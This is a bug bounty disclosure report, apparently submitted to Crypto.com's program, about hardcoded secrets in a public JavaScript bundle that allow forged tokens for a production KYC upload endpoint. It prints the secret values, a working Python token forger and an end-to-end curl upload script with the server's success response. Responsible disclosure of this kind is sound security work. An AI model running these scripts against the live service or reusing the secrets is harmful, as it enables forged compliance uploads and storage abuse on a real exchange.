## Summary:

**Program:** Crypto.com Bug Bounty (https://hackerone.com/crypto)
**Severity:** Critical
**CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/I:H/A:L — Score: 9.3 (Critical)
**CWE:** CWE-321 (Use of Hard-coded Cryptographic Key) / CWE-522 (Insufficiently Protected Credentials)
**Date:** 2026-04-10

The production JavaScript bundle served at `webview.titan.crypto.com` contains hardcoded cryptographic secrets used to authenticate uploads to `exchange-fe.crypto.com/v1/files/vip-form-upload-files` — a VIP/KYC document submission endpoint. Because the authentication token is both generated client-side and derived entirely from secrets that are publicly visible in the JS bundle, any external party can forge a valid token and submit files to the compliance upload system without holding an authenticated user account.

---

## Vulnerability Details

### Affected Assets

| Asset | Role |
|-------|------|
| `webview.titan.crypto.com/assets/index-CNB59Ns7.js` | Public JS bundle containing hardcoded secrets |
| `exchange-fe.crypto.com/v1/files/vip-form-upload-files` | VIP KYC upload endpoint (production) |

Both are within the `*.crypto.com` in-scope wildcard.

### Hardcoded Secrets

The following values are present in plaintext in the production JS bundle:

```
VITE_UPLOAD_SECRET_KEY   = "iu-fbf_2502=gexeanch"   (AES passphrase)
VITE_UPLOAD_SECRET_TOKEN = "4-not_hacked=kento"      (plaintext token value)
VITE_SEGMENT_KEY         = "HWgYAxmPEmBWfV1EBdQJyKIbaeao1dzS"
```

The bundle also contains `VITE_APP_ENV = "dprd"`, but the BFF target is `exchange-fe.crypto.com` — a production domain — confirming the upload endpoint is live in production.

### Token Generation Logic (from decompiled JS)

```javascript
// wW = VITE_UPLOAD_SECRET_KEY = "iu-fbf_2502=gexeanch"
// AW = VITE_UPLOAD_SECRET_TOKEN = "4-not_hacked=kento"

token = CryptoJS.AES.encrypt(
  JSON.stringify({ timestamp: Date.now(), token: AW }),
  wW
).toString()

// Token is then submitted as a multipart form field:
// POST /v1/files/vip-form-upload-files
// Content-Type: multipart/form-data
// Fields: token=<token>, files=<file>
```

`CryptoJS.AES.encrypt(message, passphrase)` uses OpenSSL's EVP_BytesToKey (MD5-based) for key derivation and outputs a base64-encoded `Salted__<8-byte-salt><ciphertext>` string — fully reproducible in any language.

---

## Impact

An unauthenticated attacker can:

1. **Pollute the KYC/compliance pipeline** — Submit forged identity documents under any user context, potentially causing fraudulent KYC approvals. This has direct regulatory implications for Crypto.com's compliance posture under AML/KYC obligations.

2. **Storage abuse** — Upload arbitrary files to Crypto.com's CDN at scale with no rate limiting observed during testing. This infrastructure could be weaponized for malware hosting or content abuse under Crypto.com's trusted domain.

3. **Persistence** — Uploaded files receive permanent CDN URLs. Even after the secret is rotated, previously uploaded files remain accessible internally and cannot be retroactively invalidated without a full storage audit.

4. **No account required** — The attack requires zero authentication, zero user interaction, and is fully automatable. Any external party with access to the public JS bundle can forge valid tokens indefinitely until the secrets are rotated.

5. **File type validation unknown** — Only a benign 1x1 PNG was uploaded during research to minimize impact. It is unknown whether the endpoint accepts arbitrary file types including HTML, JavaScript, or executable formats. If no server-side MIME validation exists, the impact surface expands significantly.

> **Note on rate limiting:** No rate limiting or throttling was observed during testing. Multiple token forgery and upload attempts succeeded without any 429 or block response, suggesting the endpoint may be vulnerable to automated bulk abuse.

---

## Steps To Reproduce

### Proof of Concept

### Step 1 — Extract secrets from the public bundle

```bash
curl -s "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" \
  | grep -o '"iu-fbf[^"]*"'
# Output: "iu-fbf_2502=gexeanch"

curl -s "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" \
  | grep -o '"4-not_hacked[^"]*"'
# Output: "4-not_hacked=kento"
```

### Step 2 — Forge a valid upload token (Python)

```python
#!/usr/bin/env python3
import os, base64, hashlib, json, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

SECRET_KEY   = "iu-fbf_2502=gexeanch"
SECRET_TOKEN = "4-not_hacked=kento"

def evp_bytes_to_key(password, salt):
    """Replicates CryptoJS/OpenSSL EVP_BytesToKey with MD5, 1 iteration."""
    password = password.encode()
    d, prev = b'', b''
    while len(d) < 48:
        prev = hashlib.md5(prev + password + salt).digest()
        d += prev
    return d[:32], d[32:48]   # key (32 bytes), iv (16 bytes)

salt = os.urandom(8)
key, iv = evp_bytes_to_key(SECRET_KEY, salt)
cipher = AES.new(key, AES.MODE_CBC, iv)

plaintext = json.dumps({
    "timestamp": int(time.time() * 1000),
    "token": SECRET_TOKEN
}).encode()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
token = base64.b64encode(b"Salted__" + salt + ciphertext).decode()
print(token)
```

### Step 3 — Upload a file using the forged token

```bash
TOKEN="<output from step 2>"

curl -sk -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
  -F "token=${TOKEN}" \
  -F "files=@/path/to/document.pdf;type=application/pdf"
```

### Step 4 — Upload a valid PNG — full success, file written to CDN

```bash
# Generate a minimal valid PNG
python3 -c "
import struct, zlib

def chunk(name, data):
    c = name + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\x00\x00'))
iend = chunk(b'IEND', b'')
open('/tmp/test.png','wb').write(sig+ihdr+idat+iend)
"

curl -sk -w "\nHTTP %{http_code}" \
  -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
  -H "Origin: https://webview.titan.crypto.com" \
  -H "Referer: https://webview.titan.crypto.com/" \
  -F "token=${TOKEN}" \
  -F "files=@/tmp/test.png;type=image/png;filename=test.png"
```

**Response:**
```
{"code":0,"result":[{"success":true,"fileUrl":"https://dprd-static-bff.dprd.crypto.com/MA4NRigEVVivaC3vKvB8B.png"}]}
HTTP 201
```

The file was successfully uploaded and stored on Crypto.com's CDN at `https://dprd-static-bff.dprd.crypto.com/MA4NRigEVVivaC3vKvB8B.png`. No authentication was required at any step.

---

## Recommended Remediation

1. **Immediate:** Rotate `VITE_UPLOAD_SECRET_KEY` and `VITE_UPLOAD_SECRET_TOKEN`. The current values are compromised.

2. **Short term:** Move token generation server-side. The upload endpoint should generate and validate short-lived signed tokens (e.g., HMAC-SHA256 with server-held key + expiry + user session binding) without exposing any secret to the client.

3. **Enforce authentication:** Require a valid authenticated user session (cookie/JWT) on `POST /v1/files/vip-form-upload-files` in addition to any upload token.

4. **Build pipeline audit:** Scan CI artifacts for `VITE_*` variables that contain secrets. Any value that needs to stay private must be removed from `.env` files with the `VITE_` prefix. Consider integrating a secrets scanning tool (e.g., truffleHog, gitleaks) into the CI/CD pipeline.

5. **Implement server-side file type validation:** Validate MIME type and file signature (magic bytes) server-side — do not rely solely on the client-supplied `Content-Type` header.

6. **Implement rate limiting:** Apply per-IP and per-session rate limiting on the upload endpoint to prevent automated bulk abuse.

---

## Verification Commands (for Triage)

### Confirm bundle Last-Modified date (proves secrets are current)

```bash
curl -sI "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" \
  | grep -i "last-modified\|content-length\|etag"
```

### Verify secrets are still present in the live bundle

```bash
# Confirm UPLOAD_SECRET_KEY is in the public bundle
curl -s "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" \
  | grep -o '"iu-fbf_2502=gexeanch"'
# Expected output: "iu-fbf_2502=gexeanch"

# Confirm UPLOAD_SECRET_TOKEN is in the public bundle
curl -s "https://webview.titan.crypto.com/assets/index-CNB59Ns7.js" \
  | grep -o '"4-not_hacked=kento"'
# Expected output: "4-not_hacked=kento"
```

### Full end-to-end reproduction (single script)

```bash
#!/bin/bash
# Prerequisites: python3, pycryptodome (pip install pycryptodome)
# Tested: 2026-04-10 ~14:50 CDT — HTTP 201, file written to CDN

# Step 1: generate forged token
TOKEN=$(python3 - << 'PYEOF'
import os, base64, hashlib, json, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def evp_bytes_to_key(password, salt):
    password = password.encode()
    d, prev = b'', b''
    while len(d) < 48:
        prev = hashlib.md5(prev + password + salt).digest()
        d += prev
    return d[:32], d[32:48]

salt = os.urandom(8)
key, iv = evp_bytes_to_key("iu-fbf_2502=gexeanch", salt)
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = json.dumps({"timestamp": int(time.time()*1000), "token": "4-not_hacked=kento"}).encode()
ct = cipher.encrypt(pad(pt, AES.block_size))
print(base64.b64encode(b"Salted__" + salt + ct).decode())
PYEOF
)

echo "[*] Token: $TOKEN"

# Step 2: create minimal valid 1x1 PNG
python3 -c "
import struct, zlib
def chunk(name, data):
    c = name + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\x00\x00'))
iend = chunk(b'IEND', b'')
open('/tmp/bb_poc.png','wb').write(sig+ihdr+idat+iend)
"

# Step 3: upload — expect HTTP 201 + "success":true + fileUrl
curl -sk -w "\nHTTP %{http_code}" \
  -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36" \
  -H "Origin: https://webview.titan.crypto.com" \
  -H "Referer: https://webview.titan.crypto.com/" \
  -F "token=${TOKEN}" \
  -F "files=@/tmp/bb_poc.png;type=image/png;filename=bb_poc.png"
```

**Expected output:**
```
{"code":0,"result":[{"success":true,"fileUrl":"https://dprd-static-bff.dprd.crypto.com/<random>.png"}]}
HTTP 201
```

---

## Supporting Artifacts

- **Test timestamp:** 2026-04-10 ~14:50 CDT
- **JS bundle URL:** `https://webview.titan.crypto.com/assets/index-CNB59Ns7.js`
- **Upload endpoint:** `https://exchange-fe.crypto.com/v1/files/vip-form-upload-files`
- **Confirmed CDN write:** `https://dprd-static-bff.dprd.crypto.com/MA4NRigEVVivaC3vKvB8B.png`
- **Python PoC:** Self-contained script in Verification section above (requires `pycryptodome`)
- **Attach:** Screenshot of terminal showing HTTP 201 response with fileUrl
- **Attach:** Screenshot of curl -I output showing bundle Last-Modified header
- **Attach:** Screenshot of full end-to-end bash script run (POC_C1_VIP_Upload_Bypass.sh output)

> **CDN access note:** Direct GET to the uploaded file returns HTTP 403 due to CDN hotlink protection on the storage bucket — this is expected behavior for a KYC document store. The file's existence can be confirmed internally by Crypto.com. The upload was confirmed by the server's own `HTTP 201 {"code":0,"result":[{"success":true,"fileUrl":"..."}]}` response, included as a screenshot attachment.
